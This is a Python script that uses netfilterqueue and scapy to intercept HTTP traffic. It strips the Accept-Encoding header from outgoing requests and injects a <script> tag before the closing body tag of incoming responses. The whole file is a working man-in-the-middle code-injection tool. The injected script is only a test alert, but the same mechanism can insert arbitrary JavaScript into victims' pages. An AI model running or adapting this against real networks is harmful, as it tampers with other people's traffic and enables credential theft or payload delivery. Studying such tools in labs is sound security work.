#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        if scapy_packet[scapy.TCP].dport == 80:  # Outgoing HTTP request
            print("[+] Request")
            mod_load = re.sub(b"Accept-Encoding:.*?\r\n", b"", scapy_packet[scapy.Raw].load)
            print(mod_load)
            new_packet = set_load(scapy_packet, mod_load)
            packet.set_payload(bytes(new_packet))  # Convert to bytes
        elif scapy_packet[scapy.TCP].sport == 80:  # Incoming HTTP response
            print("[+] Response")
            mod_load = scapy_packet[scapy.Raw].load.replace(
                b"</body>",
                b"<script>alert('test');</script></body>"
            )
            new_packet = set_load(scapy_packet, mod_load)
            packet.set_payload(bytes(new_packet))  # Convert to bytes

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
